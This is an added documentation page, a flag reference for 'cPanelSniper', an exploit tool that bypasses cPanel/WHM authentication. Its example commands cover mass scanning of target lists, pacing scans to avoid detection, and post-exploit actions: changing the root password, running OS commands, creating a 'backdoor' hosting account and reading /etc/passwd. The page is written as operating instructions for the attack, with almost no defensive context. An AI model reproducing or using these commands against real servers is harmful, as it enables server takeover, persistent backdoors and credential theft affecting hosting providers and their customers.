@@ -1,0 +1,138 @@
+---
+title: "cPanelSniper CLI Flags and Options Reference"
+description: "Complete reference for all cPanelSniper command-line flags: target selection, scan tuning, post-exploit options, and output control with defaults."
+---
+
+cPanelSniper accepts flags in four groups: target selection, scan tuning, post-exploit actions, and output control. Only one target flag is required per invocation — either `-u` for a single host or `-l` for a file of hosts. All other flags are optional and fall back to their defaults when omitted.
+
+```bash
+python3 cPanelSniper.py [-u URL | -l FILE] [--hostname HOST]
+                        [-t THREADS] [--timeout SECS] [--rate-limit SECS]
+                        [--action ACTION] [--passwd PASS] [--cmd CMD]
+                        [--new-user USER] [--new-domain DOMAIN] [--read-file PATH]
+                        [-o FILE] [--no-color]
+```
+
+## Target flags
+
+<ParamField path="-u / --url" type="string">
+  Single target URL to scan. Include the WHM port — typically `2087` for HTTPS or `2086` for HTTP.
+
+  ```bash
+  python3 cPanelSniper.py -u https://target.com:2087
+  ```
+
+  Required unless `-l` is provided.
+</ParamField>
+
+<ParamField path="-l / --list" type="string">
+  Path to a file containing target URLs, one per line. Targets are distributed across the thread pool as the file is read.
+
+  ```bash
+  python3 cPanelSniper.py -l targets.txt
+  ```
+
+  Required unless `-u` is provided.
+</ParamField>
+
+<ParamField path="--hostname" type="string">
+  Override the canonical `Host` header used in the exploit chain. By default cPanelSniper auto-discovers the canonical hostname by following the Stage 0 redirect. Use this flag when DNS does not resolve correctly from your machine.
+
+  ```bash
+  python3 cPanelSniper.py -u https://198.51.100.10:2087 --hostname srv01.target.com
+  ```
+</ParamField>
+
+## Scan flags
+
+<ParamField path="-t / --threads" type="integer" default="10">
+  Number of targets to scan concurrently. Increase for large target files; decrease if you are hitting network rate limits or triggering IDS alerts.
+
+  ```bash
+  python3 cPanelSniper.py -l targets.txt -t 30
+  ```
+</ParamField>
+
+<ParamField path="--timeout" type="integer" default="15">
+  Per-request timeout in seconds. Applies to every HTTP request in the exploit chain. Raise this for slow or intercontinental targets.
+
+  ```bash
+  python3 cPanelSniper.py -l targets.txt --timeout 30
+  ```
+</ParamField>
+
+<ParamField path="--rate-limit" type="float" default="0">
+  Delay in seconds inserted between each target dispatch. Useful for staying within rate-limit policies on bug bounty programs or pacing large scans to avoid detection.
+
+  ```bash
+  python3 cPanelSniper.py -l targets.txt --rate-limit 0.5
+  ```
+</ParamField>
+
+## Post-exploit flags
+
+Post-exploit flags only apply when a single target is provided via `-u`. They are silently ignored during bulk scans.
+
+<ParamField path="--action" type="string">
+  Post-exploit action to run after a successful bypass. Must be one of: `list`, `passwd`, `cmd`, `exec`, `info`, `version`, `shell`, `adduser`. See the [actions reference](/reference/actions) for details on each choice.
+
+  ```bash
+  python3 cPanelSniper.py -u https://target.com:2087 --action list
+  ```
+</ParamField>
+
+<ParamField path="--passwd" type="string">
+  New password to set. Used with `--action passwd` to change the root system password, and optionally with `--action adduser` to set the new account password (defaults to `TempPass2026!` if omitted).
+
+  ```bash
+  python3 cPanelSniper.py -u https://target.com:2087 --action passwd --passwd 'NewPass@2026!'
+  ```
+</ParamField>
+
+<ParamField path="--cmd" type="string">
+  OS command to execute on the target server. Required when using `--action cmd` or `--action exec`.
+
+  ```bash
+  python3 cPanelSniper.py -u https://target.com:2087 --action cmd --cmd "id;whoami;uname -a"
+  ```
+</ParamField>
+
+<ParamField path="--new-user" type="string">
+  Username for the new cPanel hosting account. Required with `--action adduser`.
+
+  ```bash
+  python3 cPanelSniper.py -u https://target.com:2087 --action adduser --new-user backdoor --new-domain backdoor.example.com
+  ```
+</ParamField>
+
+<ParamField path="--new-domain" type="string">
+  Primary domain for the new cPanel hosting account. Required with `--action adduser`.
+</ParamField>
+
+<ParamField path="--read-file" type="string">
+  Absolute path of a file to read from the target server. Used with `--action exec` when direct command execution is not available and the tool falls back to WHM Fileman API reads.
+
+  ```bash
+  python3 cPanelSniper.py -u https://target.com:2087 --action exec --read-file /etc/passwd
+  ```
+</ParamField>
+
+## Output flags
+
+<ParamField path="-o / --output" type="string">
+  File path for saving confirmed findings as JSON. The file is written after the scan completes. If no findings are confirmed, the file is not created.
+
+  ```bash
+  python3 cPanelSniper.py -l targets.txt -o results.json
+  ```
+
+  See the [output format reference](/reference/output-format) for the full JSON schema.
+</ParamField>
+
+<ParamField path="--no-color" type="boolean">
+  Disable ANSI color codes in terminal output. Use this when piping output to a file or log aggregator that does not interpret escape sequences.
+
+  ```bash
+  python3 cPanelSniper.py -l targets.txt --no-color | tee scan.log
+  ```
+</ParamField>
